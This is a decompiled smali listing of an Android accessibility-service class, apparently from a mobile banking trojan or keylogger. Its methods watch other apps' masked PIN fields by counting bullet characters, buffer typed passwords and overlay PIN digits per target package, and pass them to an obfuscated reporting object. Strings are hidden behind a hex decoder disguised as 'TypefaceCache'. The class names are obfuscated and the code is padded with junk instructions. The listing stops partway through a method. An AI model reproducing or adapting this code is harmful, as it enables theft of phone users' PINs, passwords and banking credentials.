.method private final monitorPinFieldChange(Ljava/lang/String;)V
    .locals 16

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    move-object/from16 v6, p1

    .line 4
    .line 5
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 6
    .line 7
    invoke-virtual {v0, v6}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 8
    .line 9
    .line 10
    move-result v0

    .line 11
    if-nez v0, :cond_0

    .line 12
    .line 13
    goto/16 :goto_7

    .line 14
    .line 15
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 16
    .line 17
    .line 18
    move-result-wide v2

    .line 19
    iget-wide v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinFieldMonitorMs:J

    .line 20
    .line 21
    sub-long v4, v2, v4

    nop

    nop

    .line 22
    .line 23
    const-wide/16 v7, 0x12c

    .line 24
    .line 25
    cmp-long v0, v4, v7

    .line 26
    .line 27
    if-gez v0, :cond_1

    .line 28
    .line 29
    goto/16 :goto_7

    .line 30
    .line 31
    :cond_1
    iput-wide v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinFieldMonitorMs:J

    .line 32
    .line 33
    :try_start_0
    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 34
    .line 35
    .line 36
    move-result-object v12
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_5

    .line 37
    if-nez v12, :cond_2

    .line 38
    .line 39
    goto/16 :goto_7

    .line 40
    .line 41
    :cond_2
    const/16 v0, 0x0

    .line 42
    :try_start_1
    invoke-direct {v1, v12, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->findPinField(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 43
    .line 44
    .line 45
    move-result-object v13
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    .line 46
    if-eqz v13, :cond_c

    .line 47
    .line 48
    :try_start_2
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 49
    .line 50
    .line 51
    move-result-object v2

    .line 52
    if-eqz v2, :cond_3

    .line 53
    .line 54
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 55
    .line 56
    .line 57
    move-result-object v2

    .line 58
    if-nez v2, :cond_4

    .line 59
    .line 60
    goto :goto_0

    .line 61
    :catchall_0
    move-exception v0

    .line 62
    goto/16 :goto_4

    .line 63
    .line 64
    :cond_3
    :goto_0
    const-string v2, ""

    .line 65
    .line 66
    :cond_4
    move v14, v0

    .line 67
    :goto_1
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    .line 68
    .line 69
    .line 70
    move-result v3

    .line 71
    if-ge v0, v3, :cond_7

    .line 72
    .line 73
    invoke-virtual {v2, v0}, Ljava/lang/String;->charAt(I)C

    .line 74
    .line 75
    .line 76
    move-result v3

    .line 77
    const/16 v4, 0x2022

    nop

    nop

    .line 78
    .line 79
    if-eq v3, v4, :cond_5

    .line 80
    .line 81
    const v4, 0x2a

    .line 82
    .line 83
    if-eq v3, v4, :cond_5

    .line 84
    .line 85
    const/16 v4, 0x25cf

    .line 86
    .line 87
    if-eq v3, v4, :cond_5

    .line 88
    .line 89
    const/16 v4, 0x2b24

    .line 90
    .line 91
    if-eq v3, v4, :cond_5

    .line 92
    .line 93
    const v4, 0x25cb

    .line 94
    .line 95
    if-ne v3, v4, :cond_6

    .line 96
    .line 97
    :cond_5
    add-int/lit8 v14, v14, 0x1

    .line 98
    .line 99
    :cond_6
    add-int/lit8 v0, v0, 0x1

    .line 100
    .line 101
    goto :goto_1

    .line 102
    :cond_7
    if-nez v14, :cond_8

    .line 103
    .line 104
    iget v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotCount:I

    .line 105
    .line 106
    if-lez v0, :cond_8

    .line 107
    .line 108
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotPkg:Ljava/lang/String;

    .line 109
    .line 110
    invoke-static {v6, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 111
    .line 112
    .line 113
    move-result v0

    .line 114
    if-eqz v0, :cond_8

    .line 115
    .line 116
    invoke-direct/range {p0 .. p1}, Lapp/mobilex/plus/services/DataQFAdapter;->flushPinBufferNow(Ljava/lang/String;)V

    .line 117
    .line 118
    .line 119
    :cond_8
    if-lez v14, :cond_b

    .line 120
    .line 121
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotPkg:Ljava/lang/String;

    .line 122
    .line 123
    invoke-static {v6, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 124
    .line 125
    .line 126
    move-result v0

    .line 127
    if-eqz v0, :cond_b

    .line 128
    .line 129
    iget v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotCount:I

    .line 130
    .line 131
    if-le v14, v0, :cond_b

    .line 132
    .line 133
    if-ltz v0, :cond_b

    .line 134
    .line 135
    sub-int v0, v14, v0

    .line 136
    .line 137
    const/16 v2, 0x1

    .line 138
    if-ne v0, v2, :cond_b

    .line 139
    .line 140
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 141
    .line 142
    invoke-static {v6, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 143
    .line 144
    .line 145
    move-result v0

    nop

    nop

    .line 146
    if-eqz v0, :cond_9

    .line 147
    .line 148
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 149
    .line 150
    goto/16 :goto_2

    .line 151
    :cond_9
    invoke-direct/range {p0 .. p1}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 152
    .line 153
    .line 154
    move-result-object v0

    .line 155
    :goto_2
    sget-object v15, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 156
    .line 157
    const-string v2, "0033007F005500B800F400B000C6"

    .line 158
    .line 159
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 160
    .line 161
    .line 162
    move-result-object v3

    .line 163
    const-string v2, "001800720052008000F900AB0092"

    .line 164
    .line 165
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 166
    .line 167
    .line 168
    move-result-object v2

    .line 169
    new-instance v4, Ljava/lang/StringBuilder;

    .line 170
    .line 171
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 172
    .line 173
    .line 174
    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 175
    .line 176
    .line 177
    invoke-virtual {v4, v14}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 178
    .line 179
    .line 180
    const-string v2, "]"

    .line 181
    .line 182
    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 183
    .line 184
    .line 185
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 186
    .line 187
    .line 188
    move-result-object v4

    .line 189
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 190
    .line 191
    .line 192
    move-result v2

    .line 193
    if-nez v2, :cond_a

    .line 194
    .line 195
    move-object/from16 v5, v6

    .line 196
    goto/16 :goto_3

    .line 197
    :cond_a
    move-object v5, v0

    .line 198
    :goto_3
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 199
    .line 200
    .line 201
    move-result-wide v7

    .line 202
    const-string v0, "0033007F005500B800E000BE00D6"

    .line 203
    .line 204
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 205
    .line 206
    .line 207
    move-result-object v9

    .line 208
    new-instance v2, Lv/s/NxAMaDFbSCxW6M03f;

    .line 209
    .line 210
    const/4 v10, 0x1

    .line 211
    const/16 v11, 0xc0

    .line 212
    .line 213
    invoke-direct/range {v2 .. v11}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;ZI)V

    .line 214
    .line 215
    .line 216
    invoke-virtual {v15, v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 217
    .line 218
    .line 219
    :cond_b
    iput v14, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotCount:I

    .line 220
    .line 221
    iput-object v6, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotPkg:Ljava/lang/String;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 222
    .line 223
    :try_start_3
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_3

    .line 224
    .line 225
    .line 226
    goto :goto_5

    .line 227
    :goto_4
    :try_start_4
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 228
    .line 229
    .line 230
    :catchall_1
    :try_start_5
    throw v0
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 231
    :catchall_2
    move-exception v0

    .line 232
    goto/16 :goto_6

    .line 233
    :catchall_3
    :cond_c
    :goto_5
    :try_start_6
    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_5

    .line 234
    .line 235
    .line 236
    goto :goto_7

    .line 237
    :goto_6
    :try_start_7
    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_4

    .line 238
    .line 239
    .line 240
    :catchall_4
    :try_start_8
    throw v0
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_5

    .line 241
    :catchall_5
    :goto_7
    return-void
.end method

.method public static synthetic nQilHWaqS401ZtR(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->scheduleKeylogFlush$lambda$10(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static final onAccessibilityEvent$lambda$41(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;)V
    .locals 13

    .line 1
    move-object/from16 v11, p5

    .line 2
    .line 3
    move-object/from16 v12, p6

    .line 4
    .line 5
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordBuffers:Ljava/util/HashMap;

    .line 6
    .line 7
    invoke-virtual {v0, p1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 8
    .line 9
    .line 10
    move-result-object v0

    .line 11
    check-cast v0, Ljava/lang/StringBuilder;

    .line 12
    .line 13
    if-eqz v0, :cond_1

    .line 14
    .line 15
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 16
    .line 17
    .line 18
    move-result-object v0

    .line 19
    if-nez v0, :cond_0

    .line 20
    .line 21
    goto :goto_0

    .line 22
    :cond_0
    move-object v2, v0

    .line 23
    goto :goto_1

    .line 24
    :cond_1
    :goto_0
    move-object v2, p2

    .line 25
    :goto_1
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    .line 26
    .line 27
    .line 28
    move-result v0

    .line 29
    const/16 v1, 0x2

    .line 30
    if-lt v0, v1, :cond_3

    .line 31
    .line 32
    const-string v0, "002800730042008B00FF00B8"

    nop

    nop

    .line 33
    .line 34
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 35
    .line 36
    .line 37
    move-result-object v1

    nop

    .line 38
    invoke-virtual/range {p3 .. p3}, Ljava/lang/String;->length()I

    .line 39
    .line 40
    .line 41
    move-result v0

    .line 42
    if-nez v0, :cond_2

    nop

    nop

    .line 43
    .line 44
    move-object/from16 v3, p4

    .line 45
    .line 46
    goto :goto_2

    .line 47
    :cond_2
    move-object/from16 v3, p3

    .line 48
    .line 49
    :goto_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 50
    .line 51
    .line 52
    move-result-wide v5

    .line 53
    iget-object v0, v11, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 54
    .line 55
    move-object v7, v0

    .line 56
    check-cast v7, Ljava/lang/String;

    .line 57
    .line 58
    iget-object v0, v12, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 59
    .line 60
    move-object v8, v0

    .line 61
    check-cast v8, Ljava/lang/String;

    .line 62
    .line 63
    move-object/from16 v0, p7

    .line 64
    .line 65
    iget-object v0, v0, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 66
    .line 67
    move-object v9, v0

    .line 68
    check-cast v9, Ljava/lang/String;

    .line 69
    .line 70
    new-instance v0, Lv/s/NxAMaDFbSCxW6M03f;

    nop

    nop

    .line 71
    .line 72
    const/16 v10, 0x1

    nop

    .line 73
    move-object/from16 v4, p4

    .line 74
    .line 75
    invoke-direct/range {v0 .. v10}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 76
    .line 77
    .line 78
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 79
    .line 80
    invoke-virtual {v1, v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 81
    .line 82
    .line 83
    iget-object v0, v11, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 84
    .line 85
    check-cast v0, Ljava/lang/String;

    .line 86
    .line 87
    iget-object v1, v12, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 88
    .line 89
    check-cast v1, Ljava/lang/String;

    .line 90
    .line 91
    invoke-static {v4, v2, v0, v1}, Lv/s/GARjgaGEpTotOxcl8vfe;->hV4VTKNUdeHN(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 92
    .line 93
    .line 94
    iget-object v0, v11, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 95
    .line 96
    check-cast v0, Ljava/lang/String;

    .line 97
    .line 98
    iget-object v1, v12, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 99
    .line 100
    check-cast v1, Ljava/lang/String;

    .line 101
    .line 102
    const/16 v3, -0xa

    add-int/lit8 v3, v3, 0xb

    .line 103
    invoke-static {v4, v2, v0, v1, v3}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 104
    .line 105
    .line 106
    :cond_3
    iget-object p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordGrabberRunnables:Ljava/util/HashMap;

    .line 107
    .line 108
    invoke-virtual {p0, p1}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 109
    .line 110
    .line 111
    return-void
.end method

.method private final onPinOverlayDigit(Ljava/lang/String;Ljava/lang/String;JZ)V
    .locals 14

    .line 1
    move-object/from16 v4, p2

    .line 2
    .line 3
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    nop

    .line 4
    .line 5
    invoke-static {v4, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 6
    .line 7
    .line 8
    move-result v0

    .line 9
    if-eqz v0, :cond_0

    .line 10
    .line 11
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 12
    .line 13
    goto :goto_0

    .line 14
    :cond_0
    invoke-direct {p0, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 15
    .line 16
    .line 17
    move-result-object v0

    .line 18
    :goto_0
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayBuffer:Ljava/util/HashMap;

    .line 19
    .line 20
    invoke-interface {v1, v4}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 21
    .line 22
    .line 23
    move-result-object v2

    .line 24
    if-nez v2, :cond_1

    .line 25
    .line 26
    new-instance v2, Ljava/lang/StringBuilder;

    .line 27
    .line 28
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 29
    .line 30
    .line 31
    invoke-interface {v1, v4, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 32
    .line 33
    .line 34
    :cond_1
    move-object v10, v2

    .line 35
    check-cast v10, Ljava/lang/StringBuilder;

    .line 36
    .line 37
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayLastTime:Ljava/util/HashMap;

    .line 38
    .line 39
    invoke-virtual {v1, v4}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 40
    .line 41
    .line 42
    move-result-object v1

    .line 43
    check-cast v1, Ljava/lang/Long;

    .line 44
    .line 45
    if-nez v1, :cond_2

    .line 46
    .line 47
    const-wide/16 v1, 0x0

    .line 48
    .line 49
    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 50
    .line 51
    .line 52
    move-result-object v1

    .line 53
    :cond_2
    invoke-virtual {v1}, Ljava/lang/Number;->longValue()J

    .line 54
    .line 55
    .line 56
    move-result-wide v1

    .line 57
    sub-long v1, p3, v1

    .line 58
    .line 59
    const-wide/16 v5, 0x1388

    .line 60
    .line 61
    cmp-long v1, v1, v5

    nop

    nop

    .line 62
    .line 63
    const/16 v11, 0x0

    .line 64
    if-lez v1, :cond_3

    .line 65
    .line 66
    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 67
    .line 68
    .line 69
    :cond_3
    invoke-static/range {p3 .. p4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 70
    .line 71
    .line 72
    move-result-object v1

    .line 73
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayLastTime:Ljava/util/HashMap;

    .line 74
    .line 75
    invoke-interface {v2, v4, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 76
    .line 77
    .line 78
    const/16 v12, -0x50

    add-int/lit8 v12, v12, 0x51

    nop

    .line 79
    const-string v1, "006A0036004B008C00F700E2"

    .line 80
    .line 81
    if-eqz p5, :cond_5

    nop

    nop

    .line 82
    .line 83
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 84
    .line 85
    .line 86
    move-result p1

    .line 87
    if-lez p1, :cond_4

    .line 88
    .line 89
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 90
    .line 91
    .line 92
    move-result p1

    .line 93
    sub-int/2addr p1, v12

    .line 94
    invoke-virtual {v10, p1}, Ljava/lang/StringBuilder;->deleteCharAt(I)Ljava/lang/StringBuilder;

    .line 95
    .line 96
    .line 97
    :cond_4
    sget-object p1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 98
    .line 99
    const-string v0, "0013005F007500C700F200BE00D100AC00300066005A008400F500FF009A00A5003600700006"

    .line 100
    .line 101
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 102
    .line 103
    .line 104
    move-result-object v0

    .line 105
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 106
    .line 107
    .line 108
    move-result-object v1

    .line 109
    new-instance v2, Ljava/lang/StringBuilder;

    .line 110
    .line 111
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 112
    .line 113
    .line 114
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 115
    .line 116
    .line 117
    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 118
    .line 119
    .line 120
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 121
    .line 122
    .line 123
    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 124
    .line 125
    .line 126
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 127
    .line 128
    .line 129
    move-result-object v0

    .line 130
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 131
    .line 132
    .line 133
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V

    .line 134
    .line 135
    .line 136
    return-void

    .line 137
    :cond_5
    invoke-virtual {v10, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 138
    .line 139
    .line 140
    sget-object v13, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 141
    .line 142
    const-string v2, "0013005F007500C700F400B600D500AE0037002C001B"

    .line 143
    .line 144
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 145
    .line 146
    .line 147
    move-result-object v2

    nop

    .line 148
    const-string v3, "0063003E0059009200F600E2"

    nop

    nop

    .line 149
    .line 150
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 151
    .line 152
    .line 153
    move-result-object v3

    .line 154
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 155
    .line 156
    .line 157
    move-result-object v1

    nop

    .line 158
    new-instance v5, Ljava/lang/StringBuilder;

    .line 159
    .line 160
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 161
    .line 162
    .line 163
    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 164
    .line 165
    .line 166
    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 167
    .line 168
    .line 169
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 170
    .line 171
    .line 172
    invoke-virtual {v5, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 173
    .line 174
    .line 175
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 176
    .line 177
    .line 178
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 179
    .line 180
    .line 181
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 182
    .line 183
    .line 184
    move-result-object v1

    .line 185
    invoke-virtual {v13}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 186
    .line 187
    .line 188
    invoke-static {v1}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V

    .line 189
    .line 190
    .line 191
    const-string v1, "00370077004B00B800FB00BA00CB"

    .line 192
    .line 193
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 194
    .line 195
    .line 196
    move-result-object v1

    .line 197
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 198
    .line 199
    .line 200
    move-result v2

    .line 201
    if-nez v2, :cond_6

    .line 202
    .line 203
    move-object/from16 v3, v4

    .line 204
    goto :goto_1

    nop

    nop

    .line 205
    :cond_6
    move-object v3, v0

    .line 206
    :goto_1
    const-string v0, "0033007F005500B800E000BE00D6"

    .line 207
    .line 208
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 209
    .line 210
    .line 211
    move-result-object v7

    .line 212
    new-instance v0, Lv/s/NxAMaDFbSCxW6M03f;

    .line 213
    .line 214
    const/16 v8, 0x1

    .line 215
    const/16 v9, 0xc0

    .line 216
    .line 217
    move-object v2, p1

    .line 218
    move-wide/from16 v5, p3

    .line 219
    .line 220
    invoke-direct/range {v0 .. v9}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;ZI)V

    .line 221
    .line 222
    .line 223
    invoke-virtual {v13, v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 224
    .line 225
    .line 226
    iget-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->TRUST_PKG:Ljava/lang/String;

    .line 227
    .line 228
    invoke-static {v4, p1}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 229
    .line 230
    .line 231
    move-result p1

    nop

    nop

    .line 232
    const-string v0, "0033007F005500B800FF00A900D700B5002F00770042"

    .line 233
    .line 234
    const-string v1, "0033007F0055"

    .line 235
    .line 236
    if-eqz p1, :cond_8

    .line 237
    .line 238
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 239
    .line 240
    .line 241
    move-result p1

    .line 242
    const/16 v2, -0x3e

    add-int/lit8 v2, v2, 0x44

    nop

    nop

    .line 243
    if-lt p1, v2, :cond_7

    .line 244
    .line 245
    invoke-virtual {v10, v11, v2}, Ljava/lang/StringBuilder;->substring(II)Ljava/lang/String;

    .line 246
    .line 247
    .line 248
    move-result-object p1

    nop

    .line 249
    const-string v2, "00170064004E009400E400FF00E2008E000D00360058008800FD00AF00DE00A200370073000100C7"

    .line 250
    .line 251
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 252
    .line 253
    .line 254
    move-result-object v2

    .line 255
    new-instance v3, Ljava/lang/StringBuilder;

    .line 256
    .line 257
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 258
    .line 259
    .line 260
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 261
    .line 262
    .line 263
    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 264
    .line 265
    .line 266
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 267
    .line 268
    .line 269
    move-result-object v2

    .line 270
    invoke-static {v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V

    .line 271
    .line 272
    .line 273
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 274
    .line 275
    .line 276
    move-result-wide v2

    nop

    .line 277
    iput-wide v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinGrabTime:J

    .line 278
    .line 279
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 280
    .line 281
    .line 282
    move-result-object v1

    .line 283
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 284
    .line 285
    .line 286
    move-result-object v0

    .line 287
